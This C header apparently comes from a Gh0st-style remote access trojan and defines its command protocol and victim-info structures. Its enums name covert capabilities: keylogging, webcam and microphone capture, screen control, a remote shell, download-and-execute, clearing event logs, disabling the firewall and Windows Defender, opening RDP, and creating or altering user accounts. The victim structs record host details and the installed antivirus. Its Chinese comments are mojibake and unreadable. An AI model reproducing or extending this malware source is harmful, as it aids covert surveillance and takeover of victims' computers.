#pragma once
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED
enum
{
	/// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������

	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�

	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_AERO_DISABLE,			// ��������ϳ�(Aero)
	COMMAND_AERO_ENABLE,			// ��������ϳ�(Aero)
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����

	
	COMMAND_DESKTOP_EXPLORER,			// ����Դ������
	COMMAND_DESKTOP_RUN,			// ������
	COMMAND_DESKTOP_POWERSHELL,			// ��powershell
	COMMAND_DESKTOP_CMROME,			// �򿪹ȸ�
	COMMAND_DESKTOP_EDGE,			// ��edge
	COMMAND_DESKTOP_FIREFOX,			// �򿪻��
	COMMAND_DESKTOP_IE,			// ��IE

	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����
	COMMAND_newSCREEN_SPY,				// ����Ļ�鿴
	COMMAND_newAERO_DISABLE,			// ��������ϳ�(Aero)
	COMMAND_newAERO_ENABLE,			// ��������ϳ�(Aero)
	COMMAND_newSCREEN_RESET,			// �ı���Ļ���
	COMMAND_newALGORITHM_RESET,		// �ı��㷨
	COMMAND_newSCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_newSCREEN_CONTROL,			// ��Ļ����
	COMMAND_newSCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_newSCREEN_BLANK,			// ����˺���
	COMMAND_newSCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_newSCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_newSCREEN_SET_CLIPBOARD,	// ����Զ�̼�����
	COMMAND_SSLIST,						//��ȡ�����б�

	COMMAND_TASKLIST,					//��ȡ�ƻ������б�
	COMMAND_TASKCREAT,				//
	COMMAND_TASKDEL,//
	COMMAND_TASKSTOP,
	COMMAND_TASKSTART,

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)
	COMMAND_UALITY30,
	COMMAND_UALITY75,
	COMMAND_UALITY100,
	COMMAND_KEYBOARD,	// ���̼�¼
	COMMAND_DESKTOP,
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����
	COMMAND_KEYBOARD_GET,			// ��ȡ��¼
	COMMAND_GN,							//ʵ�ù���
	COMMAND_AUDIO,					// ��������
	COMMAND_SPEAKER,				// ����������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_SYSTEMINFO,				// ϵͳ��Ϣ
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_KILLPROCESSDEL,		//�رս��̲�ɾ���ļ�
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_WINDOW_CLOSE,           // �رմ���
	COMMAND_WINDOW_TEST,            // ��������
	COMMAND_KILLPROCEDELE,			// �رս��̲�ɾ���ļ�
	COMMAND_SOFTWARELIST,           // ����б�
	COMMAND_IHLIST,                 // IE�����¼
	COMMAND_IHFILE,                 // ��ʷ�ļ�����
	COMMAND_NSLIST,                 // ���������б�
	COMMAND_APPUNINSTALL,           // ж�����
	COMMAND_GETHOSTS,               // ��ȡHost�ļ�
	COMMAND_SETHOSTS,               // �޸�Host�ļ�
	COMMAND_NETCONFIG,				// ��������
	COMMAND_REMOTE,				// Ӳ����Ϣ
	COMMAND_STARTUP,				// ������

	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_System,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Security,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Application,		// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_CHANGE_GROUP,			// ���ķ���
	COMMAND_SYSINFO,                //��������Ϣ
	COMMAND_SEND_SYSINFO,			//��ȡ��������Ϣ
	COMMAND_NET_USER,				//��net����û�
	COMMAND_GUEST,                  //����GUEST
	COMMAND_STOPFIRE,               //�رշ���ǽ
	COMMAND_CHANGE_PORT,            //�����ն˶˿�
	COMMAND_OPEN_PROXY,				//����
	COMMAND_CLOSE_3389,				//�ر�3389
	COMMAND_OPEN_3389,				//����3389
	COMMAND_DLL_3389,				//���Դ���3389dll
	COMMAND_START_MAP,				//����ӳ��
	COMMAND_CLOSE_PORT,				//�ر�ӳ��
	COMMAND_SLIST,					//��ȡϵͳ�û�
	COMMAND_DELUSER,				//ɾ���û�
	COMMAND_NET_CHANGE_PASS,		//�����û�����
	COMMAND_WTSLIST,				//�����û�
	COMMAND_WTS_Logoff,			    //ע���û�
	COMMAND_WTS_Disconnect,			//�Ͽ��û�
	COMMAND_DISABLEEUSER,
	COMMAND_ACITVEUSER,

	COMMAND_REGEDIT,                //ע������
	COMMAND_REG_FIND,               //��ѯ����  
	COMMAND_REG_DELPATH,            //ɾ����
	COMMAND_REG_CREATEPATH,         //������
	COMMAND_REG_DELKEY,             //ɾ����
	COMMAND_REG_CREATKEY,           //������
	COMMAND_SERMANAGER,				// ������� 
	COMMAND_TASK,					//�ƻ�����
	COMMAND_REMARK,					//���ı�ע
	COMMAND_HIDE_FILE,
	// ����˷����ı�ʶ
	TOKEN_AUTH = 130,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣
	TOKEN_ACCESS_ERROR,
	TOKEN_SSLIST,					// �������
	TOKEN_CHAT_START,               // ��̸��ʼ
	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_DESKTOP,
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������
	TOKEN_newBITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_newFIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_newNEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_newCLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������
	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������

	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������
	TOKEN_SPEAK_START,				// ��ʼ����������
	TOKEN_SPEAK_STOP,				// �ر�����������
	TOKEN_SEND_SPEAK_START,				//���ͱ���������
	TOKEN_SEND_SPEAK_STOP,				//�رշ��ͱ���������
	TOKEN_SPEAK_DATA,				// ��������������
	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������

	TOKEN_TASKLIST,						//�ƻ������б���Ϣ

	TOKEN_SYSINFOLIST,              // ��Ϣ�б�
	TOKEN_ADD_SUCCESS,				// ��ӳɹ�
	TOKEN_ADD_ERROR,				// ���ʧ��
	TOKEN_DEL_SUCCESS,				// ɾ���û��ɹ�
	TOKEN_DEL_ERROR,				// ɾ���û�ʧ��
	TOKEN_CHANGE_PSAA_SUCCESS,		// �޸�����ɹ�
	TOKEN_CHANGE_PSAA_ERROR,		// �޸�����ʧ��
	TOKEN_TOOLS,
	TOKEN_OPEN_SUCCESS,					// ����3389�ɹ�
	TOKEN_OPEN_ERROR,					// ����3389ʧ��

	TOKEN_CLOSE_SUCCESS,					// �ر�3389�ɹ�
	TOKEN_CLOSE_ERROR,					// �ر�3389ʧ��

	TOKEN_SLIST,					// ö��ϵͳ�û�
	TOKEN_WTSLIST,					// ö�������û�
	TOKEN_STATE_SUCCESS,			// �����û�״̬�ɹ�
	TOKEN_STATE_ERROR,				// �����û�״̬ʧ��

	TOKEN_USER_CLOSE_SUCCESS,			// �û��ر����ӳɹ�
	TOKEN__USER_CLOSE_ERROR,				// �û��ر�����ʧ��
	TOKEN_OFF_SUCCESS,			// ע���û��ɹ�
	TOKEN_OFF_ERROR,				// ע���û�ʧ��

	TOKEN_CSystemManager,
	TOKEN_SYSTEMINFO,				// ϵͳ��Ϣ
	TOKEN_PSLIST,					// �����б�
	TOKEN_ENVLIST,				//��������
	TOKEN_WSLIST,					// �����б�
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ
	TOKEN_SOFTWARE,					// ����б�
	TOKEN_IHLIST,                   // IE�����¼
	TOKEN_IHFILE,			//�ļ���ʷ
	TOKEN_REMOTE,			//Զ��
	TOKEN_NSLIST,					// ���������б�
	TOKEN_HOSTSINFO,				// Host�ļ�
	TOKEN_STARTUP,					// ������
	TOKEN_REGEDIT,                  // ��ע������
	TOKEN_REG_PATH,                 // ����ע�������
	TOKEN_REG_KEY,                  // ���ͼ���
	TOKEN_REG_OK,                   // ִ�гɹ�
	TOKEN_REG_NO,                   // ִ��ʧ��
		
	COMMAND_DLLVERSION,				// DLL VERSION
	COMMAND_DLLERROR,				// DLL ERROR 
	COMMAND_DLLMAIN,				// DLL MAIN
	COMMAND_DLLOK,					// ���Լ���DLL

	TOKEN_DLLVERSION,				// ��ȡDLL�İ汾
	TOKEN_DLLLOADERROR,				// �������ʧ��
	TOKEN_DLLMAIN,					// DLLMAIN
	TOKEN_DLLOK,

	COMMAND_PROXY,					// proxy
	COMMAND_PROXY_CONNECT, //socket5����
	COMMAND_PROXY_CLOSE,
	COMMAND_PROXY_DATA,
	TOKEN_PROXY_START,//proxy start.
	TOKEN_PROXY_CONNECT_RESULT,
	TOKEN_PROXY_CLOSE,
	TOKEN_PROXY_DATA,
	TOKEN_PROXY_BIND_RESULT_RESULT,
	TOKEN_HIDE_FINISH,
	TOKEN_OLDBITMAPINFO,
	TOKEN_FIRSTSCREEN1,
	TOKEN_NEXTSCREEN1,
	TOKEN_CLIPBOARD_TEXT1,
	COMMAND_SCREEN_RESET1,
	COMMAND_ALGORITHM_RESET1,
	COMMAND_WIN7BASIC1,
	COMMAND_SCREEN_CTRL_ALT_DEL1,
	COMMAND_SCREEN_BLOCK_INPUT1,
	COMMAND_SCREEN_BLANK1,
	COMMAND_SCREEN_CAPTURE_LAYER1,
	COMMAND_SCREEN_GET_CLIPBOARD1,
	COMMAND_SCREEN_CONTROL1,
	COMMAND_SCREEN_SET_CLIPBOARD1,
	COMMAND_OLDPINGMU,
	COMMAND_UPDATACLIENT
};

//enum С����
enum
{
	DESK_TOP = 0x00,	// ����Ԥ��
	DISABLE_TASK,		//�������������
	ENABLE_TASK,		//�������������
	OK,
	DISABLE_DEF,		//����windows def
	ENABLE_DEF,		//��windos def
};

typedef struct
{
	BYTE			bToken;				// = 1
	IN_ADDR			nIPAddress;		//�洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			Os[0x20];			// �汾��Ϣ
	char			HostName[50];	// ������
	char			UserName[50];	// �û���
	int				CPUClockMhz;	// CPU��Ƶ
	DWORD			CPUNumber;	// CPU����
	DWORD			MemSize;		// �ڴ��С
	DWORD			HD;		// Ӳ��
	DWORD			dwSpeed;		// ����
	bool			bIsWebCam;		// �Ƿ�������ͷ
	char			Virus[40];		// ɱ�����
	char			InstallTime[0x30];	//��װ����
	char			Remark[0x30];		//��ע
}LOGININFO;

struct MYSYSINFO
{
	char szCpuInfo[128];   //CPU��Ϣ
	DWORD szMemoryFree;     //�����ڴ� 
	DWORD szDriveFreeSize;  //����Ӳ�̴�С
	CHAR szScrSize[32];    //��Ļ�ֱ���
	char szActiveTime[128]; //�ʱ��
	CHAR szQq[100];        //��ǰ��¼QQ��
	CHAR szMac[100];        //��ǰMAC��ַ
	char szGraphics[128];	//�Կ�
	DWORD Memory7;			//�Դ�
	CHAR Program[256];     //����;��
	CHAR environment[32]; //���л���
	WCHAR lpLCData[32];  //ϵͳ����
	char rport[10];			//�Ƿ���Զ�̷���
	char qiang[10];			//����ǽ״̬
};

#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 1024*3 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 1024*3// ���������ݳ���

#endif // !defined(AFX_MACROS_H_INCLUDED)